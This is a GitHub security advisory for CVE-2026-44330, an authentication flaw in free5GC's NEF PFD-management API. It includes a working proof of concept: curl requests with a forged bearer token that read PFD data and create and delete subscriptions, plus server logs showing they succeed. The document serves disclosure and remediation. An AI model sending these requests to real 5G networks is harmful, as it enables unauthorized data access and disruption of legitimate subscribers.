# [C] free5GC's NEF nnef-pfdmanagement API is unauthenticated; forged bearer tokens can read PFD data and create/delete PFD subscriptions

## Summary
Severity: Critical
Advisory: GHSA-rwww-x45w-p52w
CVE: CVE-2026-44330
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-rwww-x45w-p52w
Type: github-advisory

## Affected
- Go: `github.com/free5gc/nef` — affected >=0

## Details
### Summary
free5GC's NEF mounts the `nnef-pfdmanagement` route group without inbound OAuth2/bearer-token authorization. A network attacker who can reach NEF on the SBI can use a forged or arbitrary bearer token (e.g. `Authorization: Bearer not-a-real-token`) to read PFD application data via `GET /applications` and `GET /applications/{appID}`, and to create or delete PFD change-notification subscriptions via `POST /subscriptions` and `DELETE /subscriptions/{subID}`. Same root cause as the other NEF SBI findings: the route group is mounted without any inbound auth middleware. Unlike the OAM and traffic-influence groups, `nnef-pfdmanagement` IS declared in the runtime `ServiceList`, so this is the production-intended path that operators expect to be protected by `OAuth2 setting receive from NRF: true` -- and it is not.

### Details
Validated against the NEF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/nef:v4.2.0`
- Runtime NEF commit: `5ce35eab`
- Docker validation date: 2026-03-11

NEF advertises `OAuth2 setting receive from NRF: true`, but the entire `nnef-pfdmanagement` route group is mounted with no inbound auth middleware, so forged-token requests reach the read and subscription handlers and execute against UDR-backed state.

Code evidence (paths in `free5gc/nef`):
- Route group mounted without auth middleware: `NFs/nef/internal/sbi/server.go:56`
- Read routes exposed at `/applications` and `/applications/:appID`: `NFs/nef/internal/sbi/api_pfdf.go:13`
- Subscription routes exposed at `/subscriptions` and `/subscriptions/:subID`: `NFs/nef/internal/sbi/api_pfdf.go:13`
- `GET /applications` queries UDR for application PFD data: `NFs/nef/internal/sbi/processor/pfdf.go:19`
- `GET /applications/:appID` queries UDR for an application PFD: `NFs/nef/internal/sbi/processor/pfdf.go:53`
- `POST /subscriptions` only checks `notifyUri` is present, then stores the subscription: `NFs/nef/internal/sbi/processor/pfdf.go:83`
- `DELETE /subscriptions/:subID` removes the subscription: `NFs/nef/internal/sbi/processor/pfdf.go:110`
- NEF context only exposes outbound token acquisition (`GetTokenCtx`); there is no inbound authorization path: `NFs/nef/internal/context/nef_context.go:153`

### PoC
Reproduced end-to-end against the running NEF at `http://10.100.200.19:8000` using a fabricated bearer token.

1. Seed an AF context (also forged-token):
```
curl -i \
  -H 'Authorization: Bearer not-a-real-token' \
  -H 'Content-Type: application/json' \
  --data '{"afServiceId":"svc-pfdf-read","afAppId":"app-seed-pfdf-read","dnn":"internet","snssai":{"sst":1,"sd":"010203"},"anyUeInd":true,"trafficFilters":[{"flowId":1,"flowDescriptions":["permit out ip from 192.0.2.41 to 198.51.100.0/24"]}],"trafficRoutes":[{"dnai":"mec-pfdf-read","routeInfo":{"ipv4Addr":"10.60.0.3","portNumber":0}}]}' \
  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-pfdf-read-20260311/subscriptions
```

2. Seed one PFD application entry (also forged-token):
```
curl -i \
  -H 'Authorization: Bearer not-a-real-token' \
  -H 'Content-Type: application/json' \
  --data '{"pfdDatas":{"app-poc-pfdf-read-20260311":{"externalAppId":"app-poc-pfdf-read-20260311","pfds":{"pfd-poc":{"pfdId":"pfd-poc","urls":["^http://pfdf-read.example.com(/\\\\S*)?$"]}}}}}' \
  http://10.100.200.19:8000/3gpp-pfd-management/v1/af-poc-pfdf-read-20260311/transactions
```

3. READ PFD collection with forged token -> `200 OK` returns PFD data:
```
curl -i -H 'Authorization: Bearer not-a-real-token' \
  'http://10.100.200.19:8000/nnef-pfdmanagement/v1/applications?application-ids=app-poc-pfdf-read-20260311'
```

4. READ individual PFD with forged token -> `200 OK`:
```
curl -i -H 'Authorization: Bearer not-a-real-token' \
  http://10.100.200.19:8000/nnef-pfdmanagement/v1/applications/app-poc-pfdf-read-20260311
```

5. CREATE PFD subscription with forged token -> `201 Created`:
```
curl -i \
  -H 'Authorization: Bearer not-a-real-token' \
  -H 'Content-Type: application/json' \
  --data '{"applicationIds":["app-poc-sub1","app-poc-sub2"],"notifyUri":"http://127.0.0.1:65530/pfd-notify"}' \
  http://10.100.200.19:8000/nnef-pfdmanagement/v1/subscriptions
```

6. DELETE PFD subscription with forged token -> `204 No Content`:
```
curl -i -X DELETE \
  -H 'Authorization: Bearer not-a-real-token' \
  http://10.100.200.19:8000/nnef-pfdmanagement/v1/subscriptions/1
```

NEF container logs (`docker logs nef`) show requests reaching business handlers and returning success codes:
```
[INFO][NEF][PFDF] GetApplicationsPFD - appIDs: [app-poc-pfdf-read-20260311]
[INFO][NEF][GIN] | 200 | GET    | /nnef-pfdmanagement/v1/applications?application-ids=...
[INFO][NEF][PFDF] GetIndividualApplicationPFD - appID[app-poc-pfdf-read-20260311]
[INFO][NEF][GIN] | 200 | GET    | /nnef-pfdmanagement/v1/applications/...
[INFO][NEF][PFDF] PostPFDSubscriptions - appIDs: [app-poc-sub1 app-poc-sub2]
[INFO][NEF][GIN] | 201 | POST   | /nnef-pfdmanagement/v1/subscriptions
[INFO][NEF][PFDF] DeleteIndividualPFDSubscription - subID[1]
[INFO][NEF][GIN] | 204 | DELETE | /nnef-pfdmanagement/v1/subscriptions/1
```

### Impact
Missing inbound authentication (CWE-306) and authorization (CWE-862) on the `nnef-pfdmanagement` SBI route group. This is the production-intended PFD service for NEF (declared in the runtime `ServiceList`), so operators expect it to be protected by NRF-issued OAuth2 -- and it is not. Any party that can reach NEF on the SBI can:
- Read AF-supplied PFD application data anonymously, leaking traffic-classification policy (URL regex patterns, application identifiers) used downstream by SMF/UPF.
- Create attacker-controlled PFD change-notification subscriptions pointing at attacker-chosen `notifyUri` endpoints, turning NEF into an unauthenticated outbound HTTP request source on whatever applications the attacker subscribes to.
- Delete legitimate PFD subscriptions, denying change notifications to legitimate consumers and breaking downstream PFD-update propagation.

The defect is route-group-scoped: there is no auth middleware on the group at all, so every read and subscription endpoint inside this group inherits the missing inbound auth boundary. Severity is scored against the route group's full capability surface.

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/862
Upstream fix: https://github.com/free5gc/nef/pull/23

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-rwww-x45w-p52w
- https://nvd.nist.gov/vuln/detail/CVE-2026-44330
- https://github.com/free5gc/free5gc/issues/862
- https://github.com/free5gc/free5gc
